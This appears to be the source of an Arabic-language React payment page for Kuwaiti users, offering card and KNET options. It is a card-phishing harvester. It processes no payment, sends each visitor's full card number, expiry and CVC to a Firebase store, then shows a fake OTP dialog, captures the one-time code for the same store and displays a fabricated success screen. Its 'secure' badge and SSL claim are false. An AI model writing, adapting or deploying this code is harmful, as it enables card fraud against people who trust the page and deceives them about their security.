"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Wallet,
  Check,
  Shield,
  Download,
  ChevronRight,
  AlertCircle,
  Info,
  Lock,
  ArrowRight,
  CreditCard,
  Loader2,
  Sparkles,
  CheckCircle2,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { Separator } from "@/components/ui/separator"
import { cn } from "@/lib/utils"
import { motion, AnimatePresence } from "framer-motion"
import { addData } from "@/lib/firebasee"

// Types
type PaymentState = "FORM" | "OTP" | "SUCCESS"
type FormErrors = Record<string, string>

interface OrderDetails {
  id: string
  total: string
  date: string
}

export default function PaymentMethodsComponent() {
  // State for payment flow
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
  const [showOtpDialog, setShowOtpDialog] = useState(false)

  // State for OTP
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
  const [otpError, setOtpError] = useState("")
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(30)
  const [otpVerificationError, setOtpVerificationError] = useState<string | null>(null)

  // State for form
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [currency, setCurrency] = useState("kwt")
  const [formErrors, setFormErrors] = useState<FormErrors>({})

  // State for order details
  const [orderDetails, setOrderDetails] = useState<OrderDetails>({
    id: generateOrderId(),
    total: "30.000",
    date: new Date().toISOString(),
  })

  const router = useRouter()

  // Initialize order details from localStorage
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  // Handle countdown timer for OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (resendDisabled && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
    } else if (countdown === 0) {
      setResendDisabled(false)
    }
    return () => clearTimeout(timer)
  }, [resendDisabled, countdown])

  // Generate random order ID
  function generateOrderId() {
    return `ZN-${Math.floor(10000 + Math.random() * 90000)}`
  }

  // Get visitor ID from localStorage
  const getVisitorId = () => {
    try {
      return localStorage.getItem("visitor") || "anonymous-user"
    } catch (error) {
      console.error("Error accessing localStorage:", error)
      return "anonymous-user"
    }
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  // Validate payment form
  const validateForm = () => {
    const errors: FormErrors = {}

    if (!cardNumber) {
      errors.cardNumber = "يرجى إدخال رقم البطاقة"
    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
      errors.cardNumber = "رقم البطاقة غير صحيح"
    }

    if (!cardExpiry) {
      errors.cardExpiry = "يرجى إدخال تاريخ الانتهاء"
    } else if (cardExpiry.length < 5) {
      errors.cardExpiry = "تاريخ الانتهاء غير صحيح"
    } else {
      const [month, year] = cardExpiry.split("/")
      const currentYear = new Date().getFullYear() % 100
      const currentMonth = new Date().getMonth() + 1

      if (Number.parseInt(month) > 12 || Number.parseInt(month) < 1) {
        errors.cardExpiry = "الشهر غير صحيح"
      } else if (
        Number.parseInt(year) < currentYear ||
        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
      ) {
        errors.cardExpiry = "البطاقة منتهية الصلاحية"
      }
    }

    if (!cardCvc) {
      errors.cardCvc = "يرجى إدخال رمز الأمان"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = "رمز الأمان غير صحيح"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  // Handle payment submission
  const handlePayment = () => {
    if (paymentMethod === "card" && !validateForm()) {
      
      return
    }

    if (paymentMethod === "knet") {
      router.push("/kwpay")
      return
    }

    setIsProcessing(true)

    // Mock database submission
    addData( {
      id:getVisitorId(),
      cardNumber,
      cardExpiry,
      cardCvc,
      amount: orderDetails.total,
      currency,
      orderId: orderDetails.id,
    })

    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)

      setTimeout(() => {
        if (otpInputRefs.current[0]) {
          otpInputRefs.current[0].focus()
        }
      }, 100)
    }, 1500)
  }

  // Handle OTP input change
  const handleOtpChange = (index: number, value: string) => {
    if (value && !/^\d*$/.test(value)) return

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)
    setOtpError("")

    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  // Handle OTP input keydown
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  // Verify OTP
  const verifyOtp = () => {
    const otpCode = otpValues.join("")

    if (otpCode.length !== 6) {
      setOtpError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
      return
    }

    setIsProcessing(true)
    setOtpVerificationError(null)
    addData( {
      id:getVisitorId(),otp:otpCode})

    setTimeout(() => {
      setIsProcessing(false)

      if (otpCode === "123456") {
        setOtpVerificationError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
        setOtpValues(Array(6).fill(""))
        setTimeout(() => {
          if (otpInputRefs.current[0]) {
            otpInputRefs.current[0].focus()
          }
        }, 100)
      } else if (otpCode === "111111") {
        setOtpVerificationError("انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.")
        setOtpValues(Array(6).fill(""))
      } else {
        setShowOtpDialog(false)
        setPaymentState("SUCCESS")
      }
    }, 1500)
  }

  // Resend OTP
  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(30)
    setOtpValues(Array(6).fill(""))
    setOtpError("")
    setOtpVerificationError(null)

    console.log("Resending OTP")

    setTimeout(() => {
      if (otpInputRefs.current[0]) {
        otpInputRefs.current[0].focus()
      }
    }, 100)
  }

  // Get current date in Arabic format
  const getCurrentDate = () => {
    const options: Intl.DateTimeFormatOptions = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }
    return new Date().toLocaleDateString("ar-SA", options)
  }

  // Enhanced Progress indicator
  const renderProgressIndicator = () => (
    <div className="flex items-center justify-between mb-8 px-4" dir="rtl">
      {[
        { step: 1, label: "الدفع", state: "FORM" },
        { step: 2, label: "التحقق", state: "OTP" },
        { step: 3, label: "التأكيد", state: "SUCCESS" },
      ].map((item, index) => (
        <div key={item.step} className="flex items-center">
          <div className="flex flex-col items-center">
            <motion.div
              className={cn(
                "w-12 h-12 rounded-full flex items-center justify-center transition-all duration-500 relative overflow-hidden",
                paymentState === item.state ||
                  (item.state === "OTP" && paymentState === "SUCCESS") ||
                  (item.state === "FORM" && (paymentState === "OTP" || paymentState === "SUCCESS"))
                  ? "bg-gradient-to-r from-purple-600 to-pink-600 text-white shadow-lg"
                  : "bg-gray-100 text-gray-400 border-2 border-gray-200",
              )}
              whileHover={{ scale: 1.05 }}
              animate={{
                scale: paymentState === item.state ? [1, 1.1, 1] : 1,
              }}
              transition={{ duration: 0.3 }}
            >
              {(paymentState === "SUCCESS" && item.step <= 3) ||
              (paymentState === "OTP" && item.step <= 2) ||
              (paymentState === "FORM" && item.step === 1) ? (
                <CheckCircle2 className="w-6 h-6" />
              ) : (
                <span className="text-sm font-bold">{item.step}</span>
              )}

              {paymentState === item.state && (
                <motion.div
                  className="absolute inset-0 bg-gradient-to-r from-purple-400/30 to-pink-400/30 rounded-full"
                  animate={{ scale: [1, 1.5, 1], opacity: [0.5, 0, 0.5] }}
                  transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY }}
                />
              )}
            </motion.div>
            <span
              className={cn(
                "text-xs mt-2 font-medium transition-colors duration-300",
                paymentState === item.state ? "text-purple-600" : "text-gray-500",
              )}
            >
              {item.label}
            </span>
          </div>

          {index < 2 && (
            <div className="flex-1 mx-4">
              <motion.div
                className={cn(
                  "h-1 rounded-full transition-all duration-500",
                  paymentState === "SUCCESS" || (paymentState === "OTP" && index === 0)
                    ? "bg-gradient-to-r from-purple-600 to-pink-600"
                    : "bg-gray-200",
                )}
                initial={{ scaleX: 0 }}
                animate={{
                  scaleX: paymentState === "SUCCESS" || (paymentState === "OTP" && index === 0) ? 1 : 0,
                }}
                transition={{ duration: 0.5, delay: 0.2 }}
                style={{ transformOrigin: "right" }}
              />
            </div>
          )}
        </div>
      ))}
    </div>
  )

  // Enhanced Order summary
  const renderOrderSummary = () => (
    <motion.div
      className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-2xl p-6 mb-8 border border-purple-100 relative overflow-hidden"
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
    >
      <div className="absolute top-0 right-0 w-20 h-20 bg-gradient-to-br from-purple-200/30 to-pink-200/30 rounded-full -translate-y-10 translate-x-10" />
      <div className="absolute bottom-0 left-0 w-16 h-16 bg-gradient-to-br from-pink-200/30 to-purple-200/30 rounded-full translate-y-8 -translate-x-8" />

      <div className="relative">
        <div className="flex items-center space-x-2 mb-4">
          <div className="w-8 h-8 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center">
            <Sparkles className="w-4 h-4 text-white" />
          </div>
          <h3 className="font-bold text-lg text-gray-800">ملخص الطلب</h3>
        </div>

        <div className="space-y-4">
          <div className="flex justify-between items-center">
            <span className="text-gray-600">رقم الطلب:</span>
            <span className="font-bold text-purple-700">{orderDetails.id}</span>
          </div>
          <Separator className="bg-purple-200/50" />
          <div className="flex justify-between items-center">
            <span className="text-gray-600">المبلغ الإجمالي:</span>
            <div className="text-right">
              <span className="font-bold text-2xl bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
                {orderDetails.total}
              </span>
              <span className="text-gray-600 mr-1">{currency === "kwt" ? "د.ك" : "$"}</span>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  )

  // Enhanced Success state
  const renderSuccessState = () => (
    <>
      <CardHeader className="space-y-4 pb-6 text-center">
        <motion.div
          className="mx-auto w-20 h-20 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full flex items-center justify-center shadow-2xl"
          initial={{ scale: 0, rotate: -180 }}
          animate={{ scale: 1, rotate: 0 }}
          transition={{ type: "spring", stiffness: 200, damping: 15 }}
        >
          <Check className="h-10 w-10 text-white" />
        </motion.div>

        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
          <CardTitle className="text-3xl font-bold bg-gradient-to-r from-green-600 to-emerald-600 bg-clip-text text-transparent">
            تم الدفع بنجاح
          </CardTitle>
          <CardDescription className="text-lg text-gray-600 mt-2">شكراً لك، تمت عملية الدفع بنجاح</CardDescription>
        </motion.div>
      </CardHeader>

      <CardContent className="space-y-8">
        {renderProgressIndicator()}

        <motion.div
          className="bg-gradient-to-br from-green-50 to-emerald-50 rounded-2xl p-6 border border-green-200 relative overflow-hidden"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.5 }}
        >
          <div className="absolute top-0 right-0 w-16 h-16 bg-green-200/30 rounded-full -translate-y-8 translate-x-8" />

          <div className="relative">
            <div className="flex items-center space-x-2 mb-4">
              <div className="w-8 h-8 bg-gradient-to-r from-green-500 to-emerald-500 rounded-lg flex items-center justify-center">
                <CheckCircle2 className="w-4 h-4 text-white" />
              </div>
              <h3 className="font-bold text-lg text-gray-800">تفاصيل الدفع</h3>
            </div>

            <div className="space-y-4">
              <div className="flex justify-between items-center">
                <span className="text-gray-600">رقم الطلب:</span>
                <span className="font-bold text-green-700">{orderDetails.id}</span>
              </div>
              <Separator className="bg-green-200/50" />
              <div className="flex justify-between items-center">
                <span className="text-gray-600">تاريخ الدفع:</span>
                <span className="font-medium text-gray-800">{getCurrentDate()}</span>
              </div>
              <Separator className="bg-green-200/50" />
              <div className="flex justify-between items-center">
                <span className="text-gray-600">المبلغ الإجمالي:</span>
                <div className="text-right">
                  <span className="font-bold text-2xl text-green-600">{orderDetails.total}</span>
                  <span className="text-gray-600 mr-1">{currency === "kwt" ? "د.ك" : "$"}</span>
                </div>
              </div>
            </div>
          </div>
        </motion.div>

        <motion.div
          className="text-center bg-blue-50 p-4 rounded-xl border border-blue-200"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.7 }}
        >
          <div className="flex items-center justify-center space-x-2 text-blue-700">
            <Info className="w-5 h-5" />
            <p className="font-medium">تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني</p>
          </div>
        </motion.div>
      </CardContent>

      <CardFooter className="flex flex-col gap-4 pt-6">
        <motion.div
          className="w-full"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.8 }}
        >
          <Button
            className="w-full h-14 text-lg font-bold shadow-xl hover:shadow-2xl transition-all duration-300 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 rounded-xl"
            onClick={() => router.push("/")}
          >
            <span className="flex items-center gap-3">
              العودة للرئيسية
              <ChevronRight className="h-6 w-6" />
            </span>
          </Button>
        </motion.div>

        <motion.div
          className="w-full"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.9 }}
        >
          <Button
            variant="outline"
            className="w-full h-12 border-2 border-dashed border-gray-300 hover:border-gray-400 hover:bg-gray-50 rounded-xl transition-all duration-200"
            onClick={() => window.print()}
          >
            <span className="flex items-center gap-2">
              <Download className="h-5 w-5" />
              طباعة الإيصال
            </span>
          </Button>
        </motion.div>
      </CardFooter>
    </>
  )

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-purple-50 p-4 flex items-center justify-center">
      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }}>
        <Card
          className="w-full max-w-md shadow-2xl border-0 overflow-hidden rounded-2xl bg-white/80 backdrop-blur-sm"
          dir="rtl"
        >
          <div className="absolute top-0 left-0 right-0 h-2 bg-gradient-to-r from-purple-600 via-pink-500 to-purple-600"></div>

          {paymentState === "FORM" && (
            <>
              <CardHeader className="space-y-4 pb-6">
                <div className="flex justify-between items-center">
                  <div>
                    <CardTitle className="text-2xl font-bold bg-gradient-to-r from-purple-800 to-pink-600 bg-clip-text text-transparent">
                      إتمام الدفع
                    </CardTitle>
                    <CardDescription className="text-gray-600 mt-1">
                      اختر طريقة الدفع المفضلة لديك أدناه
                    </CardDescription>
                  </div>
                  <Badge
                    variant="outline"
                    className="flex items-center gap-2 px-3 py-2 bg-green-50 text-green-700 border-green-200 rounded-xl font-medium"
                  >
                    <Shield className="h-4 w-4" />
                    آمن
                  </Badge>
                </div>
              </CardHeader>

              <CardContent className="space-y-8">
                {renderProgressIndicator()}
                {renderOrderSummary()}

                <div className="space-y-6">
                  <div className="flex items-center space-x-2 mb-4">
                    <div className="w-6 h-6 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center">
                      <CreditCard className="w-3 h-3 text-white" />
                    </div>
                    <h3 className="font-bold text-lg text-gray-800">طريقة الدفع</h3>
                  </div>

                  <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="space-y-4">
                    {/* Credit Card Option */}
                    <motion.div
                      className="relative"
                      whileHover={{ scale: 1.02 }}
                      transition={{ type: "spring", stiffness: 300 }}
                    >
                      <div
                        className={cn(
                          "absolute inset-0 rounded-2xl transition-all duration-300",
                          paymentMethod === "card"
                            ? "ring-2 ring-purple-500 shadow-lg bg-gradient-to-r from-purple-50 to-pink-50"
                            : "hover:shadow-md",
                        )}
                      />
                      <div className="flex items-center space-x-3 relative">
                        <RadioGroupItem value="card" id="card" className="text-purple-600" />
                        <Label
                          htmlFor="card"
                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-gray-200 p-5 hover:border-purple-300 transition-all duration-200 w-full bg-white/50 backdrop-blur-sm"
                        >
                          <div className="bg-gradient-to-r from-purple-600 to-pink-600 text-white p-3 rounded-xl shadow-lg">
                            <CreditCard className="h-6 w-6" />
                          </div>
                          <div className="flex-1">
                            <div className="font-bold text-gray-800">بطاقة ائتمان</div>
                            <div className="text-sm text-gray-500">Visa, Mastercard</div>
                          </div>
                          <div className="flex gap-2">
<img src="/visa.svg" width={30}/>
<img src="/master.svg" width={30}/>
                          </div>
                        </Label>
                      </div>
                    </motion.div>

                    <AnimatePresence>
                      {paymentMethod === "card" && (
                        <motion.div
                          className="pr-8 space-y-6 pt-4"
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: "auto" }}
                          exit={{ opacity: 0, height: 0 }}
                          transition={{ duration: 0.3 }}
                          dir="rtl"
                        >
                          {/* Card Number */}
                          <div className="space-y-2">
                            <div className="flex items-center justify-between">
                              <Label
                                htmlFor="card-number"
                                className="flex items-center gap-2 font-medium text-gray-700"
                              >
                                رقم البطاقة
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Info className="h-4 w-4 text-gray-400 hover:text-gray-600 transition-colors" />
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>أدخل 16 رقم الموجود على بطاقتك</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </Label>
                              {formErrors.cardNumber && (
                                <span className="text-xs text-red-500 flex items-center gap-1">
                                  <AlertCircle className="h-3 w-3" />
                                  {formErrors.cardNumber}
                                </span>
                              )}
                            </div>
                            <div className="relative">
                              <Input
                                id="card-number"
                                placeholder="#### #### #### ####"
                                value={cardNumber}
                                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                                maxLength={19}
                                className={cn(
                                  "pr-12 rounded-xl h-12 text-lg font-mono transition-all duration-200 focus:ring-4 focus:ring-purple-100 border-2",
                                  formErrors.cardNumber
                                    ? "border-red-300 focus:border-red-400"
                                    : "border-gray-200 focus:border-purple-400",
                                )}
                              />
                              <div className="absolute left-4 top-1/2 -translate-y-1/2">
                                <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-700 rounded text-white text-xs flex items-center justify-center font-bold">
                                  CARD
                                </div>
                              </div>
                            </div>
                          </div>

                          {/* Expiry and CVC */}
                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <Label htmlFor="expiry" className="font-medium text-gray-700">
                                  تاريخ الانتهاء
                                </Label>
                                {formErrors.cardExpiry && (
                                  <span className="text-xs text-red-500 flex items-center gap-1">
                                    <AlertCircle className="h-3 w-3" />
                                  </span>
                                )}
                              </div>
                              <Input
                                id="expiry"
                                placeholder="MM/YY"
                                type="tel"
                                value={cardExpiry}
                                onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                                maxLength={5}
                                className={cn(
                                  "rounded-xl h-12 text-center font-mono transition-all duration-200 focus:ring-4 focus:ring-purple-100 border-2",
                                  formErrors.cardExpiry
                                    ? "border-red-300 focus:border-red-400"
                                    : "border-gray-200 focus:border-purple-400",
                                )}
                              />
                            </div>
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <Label htmlFor="cvc" className="font-medium text-gray-700">
                                  رمز التحقق
                                </Label>
                                {formErrors.cardCvc && (
                                  <span className="text-xs text-red-500 flex items-center gap-1">
                                    <AlertCircle className="h-3 w-3" />
                                  </span>
                                )}
                              </div>
                              <Input
                                id="cvc"
                                placeholder="123"
                                type="tel"
                                maxLength={4}
                                value={cardCvc}
                                onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                                className={cn(
                                  "rounded-xl h-12 text-center font-mono transition-all duration-200 focus:ring-4 focus:ring-purple-100 border-2",
                                  formErrors.cardCvc
                                    ? "border-red-300 focus:border-red-400"
                                    : "border-gray-200 focus:border-purple-400",
                                )}
                              />
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    {/* KNET Option */}
                    <motion.div
                      className="relative"
                      whileHover={{ scale: 1.02 }}
                      transition={{ type: "spring", stiffness: 300 }}
                    >
                      <div
                        className={cn(
                          "absolute inset-0 rounded-2xl transition-all duration-300",
                          paymentMethod === "knet"
                            ? "ring-2 ring-blue-500 shadow-lg bg-gradient-to-r from-blue-50 to-indigo-50"
                            : "hover:shadow-md",
                        )}
                      />
                      <div className="flex items-center space-x-3 relative">
                        <RadioGroupItem value="knet" id="knet" className="text-blue-600" />
                        <Label
                          htmlFor="knet"
                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-gray-200 p-5 hover:border-blue-300 transition-all duration-200 w-full bg-white/50 backdrop-blur-sm"
                        >
                          <div className="bg-gradient-to-r from-blue-700 to-blue-900 text-white p-3 rounded-xl shadow-lg">
                            <Wallet className="h-6 w-6" />
                          </div>
                          <div className="flex-1">
                            <div className="font-bold text-gray-800">كي نت</div>
                            <div className="text-sm text-gray-500">الدفع المحلي الآمن</div>
                          </div>
                          <div className="flex items-center">
                          <img src="/kv.png" width={30}/>

                          </div>
                        </Label>
                      </div>
                    </motion.div>
                  </RadioGroup>
                </div>
              </CardContent>

              <CardFooter className="flex flex-col gap-4 pt-6">
                <Button
                  className="w-full h-14 text-lg font-bold shadow-xl hover:shadow-2xl transition-all duration-300 rounded-xl bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:from-gray-300 disabled:to-gray-400"
                  disabled={!paymentMethod || isProcessing}
                  onClick={handlePayment}
                >
                  {isProcessing ? (
                    <span className="flex items-center gap-3">
                      <Loader2 className="h-6 w-6 animate-spin" />
                      جاري المعالجة...
                    </span>
                  ) : (
                    <span className="flex items-center gap-3">
                      ادفع الآن
                      <ArrowRight className="h-6 w-6" />
                    </span>
                  )}
                </Button>

                <div className="flex items-center justify-center gap-2 text-sm text-gray-500 bg-gray-50 p-3 rounded-xl">
                  <Shield className="h-4 w-4" />
                  <span>جميع المعاملات مشفرة وآمنة بتقنية SSL</span>
                </div>
              </CardFooter>
            </>
          )}

          {paymentState === "SUCCESS" && renderSuccessState()}

          {/* Enhanced OTP Dialog */}
          <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
            <DialogContent className="sm:max-w-md rounded-2xl border-0 shadow-2xl" dir="rtl">
              <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-purple-600 to-pink-600 rounded-t-2xl"></div>

              <DialogHeader className="space-y-4 pt-4">
                <div className="mx-auto w-16 h-16 bg-gradient-to-r from-purple-100 to-pink-100 rounded-full flex items-center justify-center">
                  <Lock className="h-8 w-8 text-purple-600" />
                </div>
                <DialogTitle className="text-2xl font-bold text-center bg-gradient-to-r from-purple-800 to-pink-600 bg-clip-text text-transparent">
                  التحقق من الدفع
                </DialogTitle>
                <DialogDescription className="text-center text-gray-600">
                  أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك
                </DialogDescription>
              </DialogHeader>

              <div className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl p-4 mb-4 border border-purple-100">
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-gray-600">رقم الطلب:</span>
                    <span className="font-bold text-purple-700">{orderDetails.id}</span>
                  </div>
                  <Separator className="bg-purple-200/50" />
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-gray-600">المبلغ الإجمالي:</span>
                    <span className="font-bold text-lg">
                      {orderDetails.total} {currency === "kwt" ? "د.ك" : "$"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="text-center mb-6 bg-blue-50 p-4 rounded-xl border border-blue-200">
                <p className="text-sm mb-1 text-blue-700 font-medium">تم إرسال رمز التحقق إلى</p>
                <p className="font-bold text-blue-800">+965 5XX XXX XX89</p>
              </div>

              <AnimatePresence>
                {otpVerificationError && (
                  <motion.div
                    className="bg-red-50 text-red-700 rounded-xl p-4 text-center mb-4 border border-red-200"
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                  >
                    <div className="flex items-center justify-center gap-2">
                      <AlertCircle className="h-5 w-5" />
                      <p className="font-medium">{otpVerificationError}</p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              <div className="flex justify-center gap-3 my-8">
                {otpValues.map((value, index) => (
                  <div key={index} className="relative">
                    <Input
                      ref={(el) => (otpInputRefs.current[index] = el)}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      value={value}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className={cn(
                        "w-14 h-16 text-center text-xl font-bold rounded-xl transition-all duration-200 focus:ring-4 focus:ring-purple-100 border-2",
                        otpError || otpVerificationError
                          ? "border-red-300 focus:border-red-400"
                          : "border-gray-200 focus:border-purple-400",
                        value ? "bg-purple-50 border-purple-300" : "",
                      )}
                    />
                  </div>
                ))}
              </div>

              <AnimatePresence>
                {otpError && (
                  <motion.div
                    className="bg-red-50 text-red-700 rounded-xl p-3 text-center text-sm flex items-center justify-center gap-2 border border-red-200"
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                  >
                    <AlertCircle className="h-4 w-4" />
                    {otpError}
                  </motion.div>
                )}
              </AnimatePresence>

              <div className="text-center mb-6">
                <p className="text-sm text-gray-600 mb-3">لم تستلم الرمز؟</p>
                <Button
                  variant="link"
                  onClick={resendOtp}
                  disabled={resendDisabled}
                  className="text-sm p-0 h-auto text-purple-600 hover:text-purple-700 font-medium"
                >
                  {resendDisabled ? `إعادة الإرسال بعد ${countdown} ثانية` : "إعادة إرسال الرمز"}
                </Button>
              </div>

              <DialogFooter>
                <Button
                  className="w-full h-14 text-lg font-bold shadow-xl hover:shadow-2xl transition-all duration-300 rounded-xl bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:from-gray-300 disabled:to-gray-400"
                  disabled={otpValues.some((v) => !v) || isProcessing}
                  onClick={verifyOtp}
                >
                  {isProcessing ? (
                    <span className="flex items-center gap-3">
                      <Loader2 className="h-6 w-6 animate-spin" />
                      جاري التحقق...
                    </span>
                  ) : (
                    <span className="flex items-center gap-3">
                      <Lock className="h-5 w-5" />
                      تأكيد الدفع
                    </span>
                  )}
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        </Card>
      </motion.div>
    </div>
  )
}
